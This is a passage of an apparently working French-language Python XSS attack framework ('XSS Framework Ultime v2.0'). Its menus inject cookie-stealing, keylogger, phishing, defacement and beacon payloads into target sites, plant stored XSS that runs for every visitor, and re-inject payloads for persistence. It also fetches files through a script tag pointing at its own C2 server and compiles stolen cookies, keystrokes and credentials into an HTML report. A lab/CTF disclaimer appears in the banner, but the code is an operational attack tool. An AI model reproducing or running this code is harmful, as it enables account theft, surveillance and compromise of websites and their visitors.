                        clean_url = url.split("?")[0]
                        test_params = {k: v[0] for k, v in qs.items()}
                        test_params[param] = tag
                        session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
                    else:
                        session.post(url, data={param: tag}, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
                    
                    CONSOLE.print(f"[green]Réinjection effectuée sur {url}[/green]")
            except requests.RequestException:
                pass

    def list_injections(self):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, url, param, payload, method, status, executions, last_seen, created_at "
                  "FROM injections ORDER BY created_at DESC")
        rows = c.fetchall()
        conn.close()
        return rows


persistence_mgr = PersistenceManager()


# ═════════════════════════════════════════════════════════════════════
# MODULE FICHIERS (CORRIGÉ)
# ═════════════════════════════════════════════════════════════════════

def file_upload_to_target(url, local_file_path, cookies_str=None):
    """CORRIGÉ : Détecte le formulaire d'upload et utilise ses champs"""
    if not os.path.isfile(local_file_path):
        CONSOLE.print(f"[red]Fichier introuvable : {local_file_path}[/red]")
        return None

    session = build_session(cookies_str)
    
    # 1. Récupérer la page pour trouver le formulaire d'upload
    try:
        resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        forms = extract_forms(url, resp.text)
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur de connexion : {e}[/red]")
        return None
    
    # 2. Trouver le formulaire avec input file
    upload_form = None
    file_field_name = 'file'
    for form in forms:
        for field in form['fields']:
            if field.get('type') == 'file':
                upload_form = form
                file_field_name = field['name']
                break
        if upload_form:
            break
    
    if not upload_form:
        CONSOLE.print("[yellow]Aucun formulaire d'upload détecté. Tentative sur /upload par défaut...[/yellow]")
        upload_form = {'action': urljoin(url, '/upload'), 'method': 'POST', 'fields': []}
    
    # 3. Récupérer les champs cachés (CSRF tokens)
    data = {}
    for field in upload_form.get('fields', []):
        if field.get('type') in ('hidden', 'submit'):
            data[field['name']] = field.get('value', '')
    
    # 4. Envoyer
    filename = os.path.basename(local_file_path)
    try:
        with open(local_file_path, "rb") as f:
            files = {file_field_name: (filename, f)}
            resp = session.post(upload_form['action'], data=data, files=files,
                                timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO files (action, remote_url, local_path, status, timestamp) VALUES (?,?,?,?,?)",
                  ("upload", upload_form['action'], local_file_path,
                   f"HTTP {resp.status_code}", datetime.now(timezone.utc).isoformat()))
        conn.commit()
        conn.close()
        
        CONSOLE.print(f"[green]Upload vers {upload_form['action']} — HTTP {resp.status_code}[/green]")
        return {"status": resp.status_code, "url": upload_form['action']}
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur upload : {e}[/red]")
        return None


def file_download_via_xss(url, param, method, remote_file_url, cookies_str=None):
    """CORRIGÉ : Vérifie le domaine (CORS)"""
    victim_domain = urlparse(url).netloc
    target_domain = urlparse(remote_file_url).netloc
    
    if target_domain and victim_domain != target_domain:
        CONSOLE.print(f"[yellow]Attention : CORS peut bloquer {target_domain} depuis {victim_domain}[/yellow]")
    
    session = build_session(cookies_str)
    script_tag = f"<script src='{C2_PUBLIC}/payload/PROBE?t=fetch_file&extra={quote(remote_file_url)}'></script>"
    
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    clean_url = url.split("?")[0]
    test_params = {k: v[0] for k, v in qs.items()} if qs else {}
    test_params[param] = script_tag
    
    try:
        if method.upper() == "GET":
            resp = session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        else:
            resp = session.post(url, data=test_params, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO files (action, remote_url, local_path, status, timestamp) VALUES (?,?,?,?,?)",
                  ("download_trigger", remote_file_url, "-", f"HTTP {resp.status_code}",
                   datetime.now(timezone.utc).isoformat()))
        conn.commit()
        conn.close()
        return {"status": resp.status_code}
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur : {e}[/red]")
        return None


# ═════════════════════════════════════════════════════════════════════
# MODULE RAPPORT
# ═════════════════════════════════════════════════════════════════════

def generate_html_report():
    """Génère un rapport HTML complet"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM captures ORDER BY timestamp DESC")
    captures = c.fetchall()
    c.execute("SELECT * FROM injections ORDER BY created_at DESC")
    injections = c.fetchall()
    c.execute("SELECT * FROM files ORDER BY timestamp DESC")
    files = c.fetchall()
    conn.close()

    html = f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Rapport XSS Framework v2.0 — Jathniel</title>
<style>
body {{ font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }}
h1 {{ color: #e94560; text-align: center; }}
h2 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 5px; }}
table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
th {{ background: #16213e; color: #e94560; padding: 10px; text-align: left; }}
td {{ padding: 8px; border-bottom: 1px solid #333; word-break: break-all; }}
tr:hover {{ background: #16213e; }}
.stat {{ display: inline-block; background: #16213e; padding: 15px 25px; margin: 5px; border-radius: 8px; text-align: center; }}
.stat-num {{ font-size: 28px; font-weight: bold; color: #e94560; }}
.stat-label {{ font-size: 12px; color: #999; }}
</style>
</head>
<body>
<h1>XSS FRAMEWORK ULTIME v2.0 — Rapport — Jathniel</h1>
<p style="text-align:center;">Généré le {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>

<div style="text-align:center;">
<div class="stat"><div class="stat-num">{len(captures)}</div><div class="stat-label">Captures</div></div>
<div class="stat"><div class="stat-num">{len(injections)}</div><div class="stat-label">Injections</div></div>
<div class="stat"><div class="stat-num">{len(files)}</div><div class="stat-label">Fichiers</div></div>
</div>

<h2>Cookies volés</h2>
<table><tr><th>Date</th><th>IP</th><th>URL</th><th>Cookies</th></tr>"""
    for cap in captures:
        if cap[1] == "cookies":
            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{(cap[5] or '')[:120]}</td></tr>"
    html += "</table>"

    html += "<h2>Frappes clavier</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Touches</th></tr>"
    for cap in captures:
        if cap[1] == "keylogger":
            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{(cap[5] or '')[:120]}</td></tr>"
    html += "</table>"

    html += "<h2>Phishing</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Données</th></tr>"
    for cap in captures:
        if cap[1] == "phishing":
            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{(cap[5] or '')[:120]}</td></tr>"
    html += "</table>"

    html += "<h2>Beacons</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Données</th></tr>"
    for cap in captures:
        if cap[1] in ("beacon", "beacon_info"):
            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{(cap[5] or '')[:120]}</td></tr>"
    html += "</table>"

    html += ("<h2>Injections</h2><table><tr><th>ID</th><th>URL</th><th>Param</th><th>Type</th>"
             "<th>Méthode</th><th>Status</th><th>Exéc.</th><th>Créé</th></tr>")
    for inj in injections:
        html += (f"<tr><td>{inj[0]}</td><td>{inj[1][:60]}</td><td>{inj[2]}</td><td>{inj[4]}</td>"
                 f"<td>{inj[3]}</td><td>{inj[5]}</td><td>{inj[6]}</td><td>{inj[8]}</td></tr>")
    html += "</table></body></html>"

    report_path = os.path.join(BASE_DIR, "rapport_xss.html")
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    return report_path


# ═════════════════════════════════════════════════════════════════════
# INTERFACE TUI
# ═════════════════════════════════════════════════════════════════════

BANNER = """
[bold red]
╔═══════════════════════════════════════════════════════════════╗
║   ██╗  ██╗███████╗███████╗                                    ║
║   ██║ ██╔╝██╔════╝██╔════╝   XSS FRAMEWORK ULTIME             ║
║   █████╔╝ ███████╗███████╗   ─── v2.0 EDITION ───             ║
║   ██╔═██╗ ╚════██║╚════██║   by JATHNIEL                       ║
║   ██║  ██╗███████║███████║   Labo / CTF / Pentest autorisé    ║
║   ╚═╝  ╚═╝╚══════╝╚══════╝                                    ║
╚═══════════════════════════════════════════════════════════════╝
[/bold red]
"""


def print_banner():
    CONSOLE.print(BANNER)
    CONSOLE.print(Panel(
        "[bold yellow]Outil de test de sécurité — Usage exclusif dans un cadre légal[/bold yellow]\n"
        "[dim]Labo personnel, CTF, pentests autorisés uniquement.[/dim]",
        border_style="red"
    ))


def press_enter():
    CONSOLE.print("\n[dim]Appuyez sur Entrée pour continuer...[/dim]")
    input()


def ask_url():
    """Demande l'URL cible avec exemples"""
    CONSOLE.print("[dim]Exemples : http://localhost:5000, http://example.com/page?id=1[/dim]")
    return Prompt.ask("[cyan]URL cible[/cyan]", default="http://example.com/")


def ask_cookies():
    """Demande les cookies de session avec exemple"""
    CONSOLE.print("[dim]Format : PHPSESSID=xxx; security=low[/dim]")
    CONSOLE.print("[dim]Laisse vide si aucun cookie nécessaire[/dim]")
    cookies = Prompt.ask("[cyan]Cookies de session[/cyan]", default="")
    return cookies or None


def menu_scan():
    CONSOLE.print("\n[bold cyan]═══ SCAN XSS ═══[/bold cyan]\n")
    url = ask_url()
    cookies = ask_cookies()

    session = build_session(cookies)
    try:
        resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        forms = extract_forms(url, resp.text)
        CONSOLE.print(f"[green]{len(forms)} formulaire(s) détecté(s)[/green]")
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Impossible de joindre la cible : {e}[/red]")
        press_enter()
        return

    with CONSOLE.status("[bold green]Scan en cours..."):
        results = []

    # Utiliser l'auto-détection
    vulnerable = auto_detect_vulnerable(url, cookies)
    
    if vulnerable:
        table = Table(title="Paramètres VULNÉRABLES", box=box.ROUNDED, border_style="red")
        table.add_column("Nom", style="bold red")
        table.add_column("Source", style="yellow")
        table.add_column("Méthode", style="magenta")
        for p in vulnerable:
            table.add_row(p['name'], p['source'], p['method'])
        CONSOLE.print(table)

    press_enter()


def menu_exploit():
    CONSOLE.print("\n[bold cyan]═══ EXPLOITATION ═══[/bold cyan]\n")
    CONSOLE.print("  [1] Vol de cookies")
    CONSOLE.print("  [2] Phishing")
    CONSOLE.print("  [3] Défiguration")
    CONSOLE.print("  [4] Keylogger")
    CONSOLE.print("  [5] Redirection")
    CONSOLE.print("  [6] Beacon")
    CONSOLE.print("  [7] Combinaison complète")
    CONSOLE.print("  [0] <- Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
    if choice == "0":
        return

    url = ask_url()
    cookies = ask_cookies()
    
    param_info = ask_param_auto(url, cookies)
    if not param_info:
        press_enter()
        return
    
    param = param_info['name']
    method = param_info['method']

    payload_map = {
        "1": "cookies", "2": "phishing", "3": "deface",
        "4": "keylogger", "5": "redirect", "6": "beacon", "7": "combined"
    }
    payload_type = payload_map.get(choice, "cookies")
    extra = ""
    if choice == "5":
        extra = Prompt.ask("[cyan]URL de redirection[/cyan]", default="https://example.com")

    with CONSOLE.status("[bold green]Injection en cours..."):
        inj_id, script_tag = exploit_inject(url, param, method, payload_type, extra, cookies_str=cookies)

    CONSOLE.print(f"\n[bold green]Injection enregistrée (ID: {inj_id})[/bold green]")
    CONSOLE.print(f"[dim]Paramètre : {param} | Méthode : {method}[/dim]")

    parsed = urlparse(url)
    clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    malicious_url = f"{clean_url}?{urlencode({param: script_tag})}"
    CONSOLE.print(f"\n[bold yellow]URL malveillante :[/bold yellow]")
    CONSOLE.print(f"[cyan]{malicious_url}[/cyan]")

    press_enter()


def menu_stored():
    CONSOLE.print("\n[bold cyan]═══ XSS STOCKÉ ═══[/bold cyan]\n")
    url = ask_url()
    cookies = ask_cookies()

    session = build_session(cookies)
    try:
        resp = session.get(url, timeout=TIMEOUT_HTTP, verify=VERIFY_SSL)
        forms = extract_forms(url, resp.text)
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur : {e}[/red]")
        press_enter()
        return

    if not forms:
        CONSOLE.print("[yellow]Aucun formulaire détecté.[/yellow]")
        press_enter()
        return

    table = Table(title="Formulaires Détectés", box=box.ROUNDED)
    table.add_column("#", style="cyan")
    table.add_column("Action", style="yellow")
    table.add_column("Méthode", style="magenta")
    table.add_column("Champs", style="green")
    for i, f in enumerate(forms):
        field_names = ", ".join([x["name"] for x in f["fields"]])
        table.add_row(str(i), f["action"][:50], f["method"], field_names)
    CONSOLE.print(table)

    CONSOLE.print("\n  [1] Vol de cookies (stocké)")
    CONSOLE.print("  [2] Keylogger (stocké)")
    CONSOLE.print("  [3] Beacon + Persistance (stocké)")
    CONSOLE.print("  [0] <- Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="3")
    if choice == "0":
        return

    payload_map = {"1": "cookies", "2": "keylogger", "3": "combined"}
    payload_type = payload_map.get(choice, "combined")

    with CONSOLE.status("[bold green]Injection stockée en cours..."):
        inj_id, results = exploit_stored(url, forms, payload_type, cookies_str=cookies)

    if inj_id:
        CONSOLE.print(f"\n[bold green]Injection stockée active (ID: {inj_id})[/bold green]")
        CONSOLE.print("[yellow]Le payload s'exécutera pour tout visiteur.[/yellow]")

    rt = Table(title="Résultats", box=box.ROUNDED)
    rt.add_column("Formulaire", style="cyan")
    rt.add_column("Statut", style="yellow")
    for r in results:
        rt.add_row(r["form"][:50], r["status"])
    CONSOLE.print(rt)

    press_enter()


def menu_persistence():
    CONSOLE.print("\n[bold cyan]═══ PERSISTANCE ═══[/bold cyan]\n")
    CONSOLE.print("  [1] Activer la persistance")
    CONSOLE.print("  [2] Désactiver la persistance")
    CONSOLE.print("  [3] Lister les injections actives")
    CONSOLE.print("  [4] Supprimer une injection")
    CONSOLE.print("  [0] <- Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")

    if choice == "1":
        persistence_mgr.start()
    elif choice == "2":
        persistence_mgr.stop()
    elif choice == "3":
        rows = persistence_mgr.list_injections()
        table = Table(title="Injections", box=box.ROUNDED)
        table.add_column("ID", style="cyan")
        table.add_column("URL", style="yellow", max_width=40)
        table.add_column("Param", style="magenta")
        table.add_column("Type", style="red")
        table.add_column("Status", style="green")
        table.add_column("Exéc.", style="bold")
        for r in rows:
            table.add_row(str(r[0]), r[1][:40], r[2], r[3], r[5], str(r[6]))
        CONSOLE.print(table)
    elif choice == "4":
        inj_id = Prompt.ask("[cyan]ID de l'injection[/cyan]")
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("DELETE FROM injections WHERE id = ?", (int(inj_id),))
            conn.commit()
            conn.close()
            CONSOLE.print(f"[green]Injection {inj_id} supprimée.[/green]")
        except ValueError:
            CONSOLE.print("[red]ID invalide.[/red]")

    press_enter()


def menu_captures():
    CONSOLE.print("\n[bold cyan]═══ DONNÉES CAPTURÉES ═══[/bold cyan]\n")
    CONSOLE.print("  [1] Cookies volés")
    CONSOLE.print("  [2] Identifiants phishing")
    CONSOLE.print("  [3] Frappes clavier")
    CONSOLE.print("  [4] Beacons")
    CONSOLE.print("  [5] Tout afficher")
    CONSOLE.print("  [0] <- Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="5")
    if choice == "0":
        return

    type_map = {"1": "cookies", "2": "phishing", "3": "keylogger", "4": "beacon"}
    type_filter = type_map.get(choice)

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    if type_filter:
        c.execute("SELECT * FROM captures WHERE type = ? ORDER BY timestamp DESC", (type_filter,))
    else:
        c.execute("SELECT * FROM captures ORDER BY timestamp DESC")
    rows = c.fetchall()
    conn.close()

    if not rows:
        CONSOLE.print("[yellow]Aucune capture enregistrée.[/yellow]")
        press_enter()
        return

    table = Table(title="Captures", box=box.ROUNDED)
    table.add_column("ID", style="dim")
    table.add_column("Type", style="red")
    table.add_column("IP", style="cyan")
    table.add_column("URL", style="yellow", max_width=30)
    table.add_column("Données", style="green", max_width=50)
    table.add_column("Date", style="dim")
    for r in rows[:50]:
        table.add_row(str(r[0]), r[1], r[2] or "?", (r[4] or "")[:30], (r[5] or "")[:50], r[7])
    CONSOLE.print(table)

    press_enter()


def menu_files():
    CONSOLE.print("\n[bold cyan]═══ FICHIERS ═══[/bold cyan]\n")
    CONSOLE.print("  [1] Upload un fichier vers le site cible")
    CONSOLE.print("  [2] Récupérer un fichier depuis la victime (via XSS)")
    CONSOLE.print("  [3] Historique des opérations")
    CONSOLE.print("  [0] <- Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
    if choice == "0":
        return

    if choice == "1":
        url = ask_url()
        path = Prompt.ask("[cyan]Chemin local du fichier[/cyan]")
        cookies = ask_cookies()
        file_upload_to_target(url, path, cookies_str=cookies)
    elif choice == "2":
        url = ask_url()
        param = Prompt.ask("[cyan]Paramètre[/cyan]")
        method = Prompt.ask("[cyan]Méthode[/cyan]", choices=["GET", "POST"], default="GET")
        remote_file = Prompt.ask("[cyan]URL du fichier à récupérer[/cyan]")
        cookies = ask_cookies()
        file_download_via_xss(url, param, method, remote_file, cookies_str=cookies)
    elif choice == "3":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT * FROM files ORDER BY timestamp DESC")
        rows = c.fetchall()
        conn.close()
        table = Table(title="Historique Fichiers", box=box.ROUNDED)
        table.add_column("Action", style="cyan")
        table.add_column("URL", style="yellow", max_width=40)
        table.add_column("Status", style="green")
        table.add_column("Date", style="dim")
        for r in rows:
            table.add_row(r[1], r[2][:40], r[4], r[5])
        CONSOLE.print(table)

    press_enter()


def menu_c2():
    CONSOLE.print("\n[bold cyan]═══ SERVEUR C2 ═══[/bold cyan]\n")
    CONSOLE.print(f"  IP locale détectée : [cyan]{get_local_ip()}[/cyan]")
    CONSOLE.print(f"  URL publique C2    : [cyan]{C2_PUBLIC}[/cyan]")
    CONSOLE.print(f"  Écoute sur         : [cyan]{C2_HOST}:{C2_PORT}[/cyan]")
    CONSOLE.print(f"  Endpoints :")
    for ep in ["/collect/cookies", "/collect/keys", "/collect/phish", "/collect/beacon",
               "/collect/screen", "/payload/<id>", "/download/<file>"]:
        CONSOLE.print(f"    [dim]{ep}[/dim]")
    press_enter()


def main():
    db_init()
    print_banner()

    CONSOLE.print(f"[bold green]IP locale auto-détectée : {get_local_ip()}[/bold green]")
    CONSOLE.print(f"[bold green]C2 public configuré sur : {C2_PUBLIC}[/bold green]\n")

    c2_thread = threading.Thread(target=run_c2_server, daemon=True)
    c2_thread.start()
    CONSOLE.print(f"[bold green]Serveur C2 démarré sur {C2_PUBLIC}[/bold green]\n")
    time.sleep(0.5)

    while True:
        CONSOLE.print("\n[bold cyan]═══════════ MENU PRINCIPAL ═══════════[/bold cyan]\n")
        CONSOLE.print("  [1] Scanner XSS (réfléchi + stocké)")
        CONSOLE.print("  [2] Exploitation (cookies, phishing, keylogger...)")
        CONSOLE.print("  [3] XSS Stocké (injection via formulaires)")
        CONSOLE.print("  [4] Persistance (activation/désactivation)")
        CONSOLE.print("  [5] Données Capturées")
        CONSOLE.print("  [6] Fichiers (upload, download)")
        CONSOLE.print("  [7] Serveur C2 (infos)")
        CONSOLE.print("  [8] Générer Rapport HTML")
        CONSOLE.print("  [0] Quitter\n")

        choice = Prompt.ask("[bold yellow]Choix[/bold yellow]", default="1")

        if choice == "0":
            persistence_mgr.stop()
            CONSOLE.print("[bold red]Au revoir — Jathniel.[/bold red]")
            sys.exit(0)
        elif choice == "1":
            menu_scan()
        elif choice == "2":
            menu_exploit()
        elif choice == "3":
            menu_stored()
        elif choice == "4":
            menu_persistence()
        elif choice == "5":
            menu_captures()
        elif choice == "6":
            menu_files()
        elif choice == "7":
            menu_c2()
        elif choice == "8":
            path = generate_html_report()
            CONSOLE.print(f"[bold green]Rapport généré : {path}[/bold green]")
            press_enter()
        else:
            CONSOLE.print("[red]Option invalide.[/red]")


if __name__ == "__main__":
    main()